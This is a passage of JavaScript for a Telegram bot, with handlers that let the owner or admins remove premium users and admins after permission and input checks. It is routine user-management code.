
    if (!adminUsers.includes(userId)) {
        adminUsers.push(userId);
        saveAdminUsers();
        console.log(`${senderId} Added ${userId} To Admin`);
        bot.sendMessage(chatId, `✅ User ${userId} has been added as an admin.`);
    } else {
        bot.sendMessage(chatId, `❌ User ${userId} is already an admin.`);
    }
});

bot.onText(/\/delprem(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    // cae apakah pengguna adalah owner atau admin
    if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
        return bot.sendMessage(chatId, "❌ You are not authorized to remove premium users.");
    }

    if (!match[1]) {
        return bot.sendMessage(chatId, "❌ Please provide a user ID. Example: /delprem 6843967527");
    }

    const userId = parseInt(match[1]);

    if (isNaN(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. User ID must be a number.");
    }

    // Cari index user dalam daftar premium
    const index = premiumUsers.findIndex(user => user.id === userId);
    if (index === -1) {
        return bot.sendMessage(chatId, `❌ User ${userId} is not in the premium list.`);
    }

    // Hapus user dari daftar
    premiumUsers.splice(index, 1);
    savePremiumUsers();
    bot.sendMessage(chatId, `✅ User ${userId} has been removed from the premium list.`);
});

bot.onText(/\/deladmin(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    // Cek apakah pengguna memiliki izin (hanya pemilik yang bisa menjalankan perintah ini)
    if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId,
            "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
            { parse_mode: "Markdown" }
        );
    }

    // Pengecekan input dari pengguna
    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID. Example: /deladmin 6843967527.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. Example: /deladmin 6843967527.");
    }

    // Cari dan hapus user dari adminUsers
    const adminIndex = adminUsers.indexOf(userId);
    if (adminIndex !== -1) {
        adminUsers.splice(adminIndex, 1);
        saveAdminUsers();
        console.log(`${senderId} Removed ${userId} From Admin`);
        bot.sendMessage(chatId, `✅ User ${userId} has been removed from admin.`);
    } else {
        bot.sendMessage(chatId, `❌ User ${userId} is not an admin.`);
    }
});